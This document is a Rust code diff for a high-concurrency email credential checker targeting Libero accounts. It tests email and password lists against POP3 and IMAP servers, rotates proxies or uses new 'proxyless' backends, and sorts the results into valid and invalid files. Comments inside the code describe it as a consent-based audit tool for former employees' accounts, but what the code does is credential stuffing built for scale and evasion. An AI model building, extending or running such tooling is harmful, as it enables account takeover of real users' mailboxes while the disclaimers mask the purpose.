@@ -47,6 +47,9 @@ use tokio::sync::Mutex as AsyncMutex;
 use tokio::task::JoinHandle;
 use tokio::time::interval;
 use memmap2::Mmap;
+use tracing_subscriber;
+
+mod proxyless;
 
 // ---------------------------------------------------------------------------
 // ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
@@ -546,6 +549,7 @@ fn create_consumer(
     stats: Arc<Stats>,
     cfg: Arc<Config>,
     proxies: ProxyPool,
+    proxyless: Option<Arc<proxyless::ProxylessManager>>,
     valid_f: Arc<Mutex<BufWriter<File>>>,
     invalid_f: Arc<Mutex<BufWriter<File>>>,
     error_f: Arc<Mutex<BufWriter<File>>>,
@@ -560,38 +564,60 @@ fn create_consumer(
             let matrix = cfg.matrix(domain);
 
             for retry in 0..=cfg.max_retries {
-                let proxy = proxies.next();
-                for item in &matrix {
-                    match item {
-                        MatrixItem::Pop { host, port, ssl, .. } => {
-                            let h = POP3Handler::new(
-                                host.clone(),
-                                *port,
-                                *ssl,
-                                cfg.timeout,
-                                proxy.clone(),
-                            );
-                            if h.login(&email, &pwd).await {
+                if let Some(pm) = &proxyless {
+                    for item in &matrix {
+                        if let MatrixItem::Pop { host, port, .. } = item {
+                            if pm
+                                .pop3_login(
+                                    host,
+                                    *port,
+                                    &email,
+                                    &pwd,
+                                    Duration::from_secs_f64(cfg.timeout),
+                                )
+                                .await
+                            {
                                 ok = true;
                                 net_err = false;
                                 break;
                             }
                             net_err = false;
                         }
-                        MatrixItem::Imap { host, port, starttls, .. } => {
-                            let h = IMAPHandler::new(
-                                host.clone(),
-                                *port,
-                                *starttls,
-                                cfg.timeout,
-                                proxy.clone(),
-                            );
-                            if h.login(&email, &pwd).await {
-                                ok = true;
+                    }
+                } else {
+                    let proxy = proxies.next();
+                    for item in &matrix {
+                        match item {
+                            MatrixItem::Pop { host, port, ssl, .. } => {
+                                let h = POP3Handler::new(
+                                    host.clone(),
+                                    *port,
+                                    *ssl,
+                                    cfg.timeout,
+                                    proxy.clone(),
+                                );
+                                if h.login(&email, &pwd).await {
+                                    ok = true;
+                                    net_err = false;
+                                    break;
+                                }
                                 net_err = false;
-                                break;
                             }
-                            net_err = false;
+                            MatrixItem::Imap { host, port, starttls, .. } => {
+                                let h = IMAPHandler::new(
+                                    host.clone(),
+                                    *port,
+                                    *starttls,
+                                    cfg.timeout,
+                                    proxy.clone(),
+                                );
+                                if h.login(&email, &pwd).await {
+                                    ok = true;
+                                    net_err = false;
+                                    break;
+                                }
+                                net_err = false;
+                            }
                         }
                     }
                 }
@@ -647,6 +673,8 @@ struct Config {
     full: bool,
     refresh: f64,
     shards: usize,
+    proxyless: bool,
+    backend: Option<String>,
     _nic_queue_pin: bool,
 }
 
@@ -698,6 +726,12 @@ struct Cli {
     /// Dashboard refresh rate seconds (min 0.016)
     #[arg(long)]
     refresh: Option<f64>,
+    /// Use proxyless backends
+    #[arg(long)]
+    proxyless: bool,
+    /// Force a specific proxyless backend
+    #[arg(long = "proxyless-backend")]
+    backend: Option<String>,
     /// Shards (fork processes)
     //Tool Description: Libero Email Credential Validator (LECV)
 //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
@@ -730,6 +764,8 @@ fn merge_cfg(cli: Cli) -> Config {
         full: false,
         refresh: 0.016,
         shards: cli.shards,
+        proxyless: cli.proxyless,
+        backend: cli.backend.clone(),
         _nic_queue_pin: false,
     };
     if let Some(c) = cli.conc { cfg.concurrency = c; }
@@ -754,8 +790,18 @@ fn merge_cfg(cli: Cli) -> Config {
 //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
 //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
 async fn run_validator(cfg: Arc<Config>) {
-    let proxies = load_proxies(&cfg.proxy_file);
-    println!("Loaded {} proxies", proxies.size());
+    let proxyless = if cfg.proxyless {
+        Some(Arc::new(proxyless::ProxylessManager::detect().await))
+    } else {
+        None
+    };
+    let proxies = if cfg.proxyless {
+        ProxyPool::new(vec!["127.0.0.1:0".to_string()])
+    } else {
+        let p = load_proxies(&cfg.proxy_file);
+        println!("Loaded {} proxies", p.size());
+        p
+    };
 
 
     let stats = Arc::new(Stats::new());
@@ -782,6 +828,7 @@ async fn run_validator(cfg: Arc<Config>) {
             stats.clone(),
             cfg.clone(),
             proxies.clone(),
+            proxyless.clone(),
             valid_f.clone(),
             invalid_f.clone(),
             error_f.clone(),
@@ -824,6 +871,7 @@ async fn run_validator(cfg: Arc<Config>) {
 // ---------------------------------------------------------------------------
 #[tokio::main]
 async fn main() {
+    tracing_subscriber::fmt::init();
     enable_tcp_tw_reuse();   // ENH#1 global sysctl tweak
     ebpf_filter::attach();   // ENH#22 optional eBPF
 
